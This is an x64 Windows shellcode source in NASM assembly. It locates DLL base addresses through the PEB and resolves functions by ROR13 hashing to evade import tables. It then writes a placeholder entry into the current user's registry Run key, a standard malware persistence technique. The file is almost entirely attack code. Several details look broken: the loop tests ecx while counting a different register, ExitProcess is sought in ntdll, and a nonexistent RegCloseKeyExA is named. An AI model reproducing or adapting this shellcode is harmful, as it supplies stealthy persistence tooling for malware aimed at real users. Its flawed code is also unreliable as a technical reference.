bits 64

section .text
global main

main:
;get dll base addresses
	sub rsp, 48h                     ;reserve stack space for called functions
	and rsp, 0fffffffffffffff0h      ;make sure stack 16-byte aligned   
 
	mov r12, [gs:60h]                ;peb
	mov r12, [r12 + 0x18]            ;Peb --> LDR
	mov r12, [r12 + 0x20]            ;Peb.Ldr.InMemoryOrderModuleList
	mov r12, [r12]                   ;2st entry
	mov r15, [r12 + 0x20]            ;ntdll.dll base address!
	mov r12, [r12]                   ;3nd entry
	mov r12, [r12 + 0x20]            ;kernel32.dll base address!

;find address of loadLibraryA from kernel32.dll which was found above. 
	mov rdx, 0xec0e4e8e
	mov rcx, r12
	call GetProcessAddress         
 
;import kernel32
	jmp getKernel32
returnGetKernel32:
	pop rcx
	call rax                        ;load kernel32.dll
	mov r12, rax
	
; ===================RegOpenKeyEx========================
	mov rdx, 0xa84aeb81 			; Hash for RegOpenKeyExA
	mov rcx, r12					; Base address for kernel32
	call GetProcessAddress  
RegOpenKeyExA:
	mov rcx, 0FFFFFFFF80000001h		; HKEY_CURRENT_USER
	jmp getRegOpenKeyEx
returnRegOpenKeyEx:
	pop rdx							; Key-path
	xor r8, r8					
	mov r9, 0x000f003f				; KEY_ALL_ACCESS
	lea r11, [rsp+0x30]				; Where to store HKEY (&hKey = rsp+0x30)
	mov [rsp+0x20], r11				; 5th argument
	call rax		

; ====================SetValueEx========================
	mov rdx, 0x2d1c9add				; Hash for RegSetValueExA
	mov rcx, r12					; Base address for kernel32
	call GetProcessAddress
	mov rcx, qword [rsp+0x30]		; HKEY
	jmp getRegSetValueKeyEx1		; First text
returnRegSetValueKeyEx1:
	pop rdx							; rdx = first text
	xor r8, r8
	mov r9, 0x1
	mov qword [rsp+0x28], 0x5		; Length of data passed as 6th argument
	jmp getRegSetValueKeyEx2		; data
returnRegSetValueKeyEx2:
	pop r11							; r11 = data
	mov [rsp+0x20], r11				; data passed as 5th argument
	call rax

; ====================CloseKey========================
	mov rdx, 0x35e273e6				; Hash for RegCloseKeyExA
	mov rcx, r12					; Base address for kernel32
	call GetProcessAddress
	mov rcx, qword [rsp+0x30]		; HKEY passed as 1st argument
	call rax
	
; ===================ExitProcess======================
	mov rdx, 0x2d3fcd70				
	mov rcx, r15
	call GetProcessAddress
	xor  rcx, rcx                  ;uExitCode
	call rax       

; ===================GetStrings=======================
getKernel32:
	call returnGetKernel32
	db  'kernel32.dll'
	db	0x00
getRegOpenKeyEx:
	call returnRegOpenKeyEx
	db 'Software\Microsoft\Windows\CurrentVersion\Run'
	db 0x00
getRegSetValueKeyEx1:
	call returnRegSetValueKeyEx1
	db 'TESTING'
	db 0x00
getRegSetValueKeyEx2:
	call returnRegSetValueKeyEx2
	db 'HELLO'
	db 0x00

; ==================GetFunction=======================
GetProcessAddress:		
	mov r13, rcx                     ;base address of dll loaded 
	mov eax, dword [r13 + 0x3c]           ;skip DOS header and go to PE header
	mov r14d, dword [r13 + rax + 0x88]    ;0x88 offset from the PE header is the export table. 

	add r14, r13                  ;make the export table an absolute base address and put it in r14d.
	mov r10d, dword [r14 + 0x18]         ;go into the export table and get the numberOfNames 
	mov ebx, dword [r14 + 0x20]          ;get the AddressOfNames offset. 
	add rbx, r13                   ;AddressofNames base. 
	
find_function_loop:	
	jecxz find_function_finished   ;if r10d is zero, quit
	dec r10d                       ;dec r10d by one for the loop until a match/none are found
	mov esi, dword [rbx + r10 * 4]      ;get a name to play with from the export table. 
	add rsi, r13                  ;esi is now the current name to search on. 
	
find_hashes:
	xor edi, edi
	xor eax, eax
	cld			
	
continue_hashing:	
	lodsb                         ;get into al from esi
	test al, al                   ;is the end of string resarched?
	jz compute_hash_finished
	ror dword edi, 0xd            ;ROR13 for hash calculation!
	add edi, eax		
	jmp continue_hashing
	
compute_hash_finished:
	cmp edi, edx                  ;edx has the function hash
	jnz find_function_loop        ;didn't match, keep trying!
	mov ebx, dword [r14 + 0x24]        ;put the address of the ordinal table and put it in ebx. 
	add rbx, r13                 ;absolute address
	xor ecx, ecx                  ;ensure ecx is 0'd. 
	mov cx, word [rbx + 2 * r10]      ;ordinal = 2 bytes. Get the current ordinal and put it in cx. ECX was our counter for which # we were in. 
	mov ebx, dword [r14 + 0x1c]        ;extract the address table offset
	add rbx, r13                 ;put absolute address in EBX.
	mov eax, dword [rbx + 4 * rcx]      ;relative address
	add rax, r13	
	
find_function_finished:
	ret  
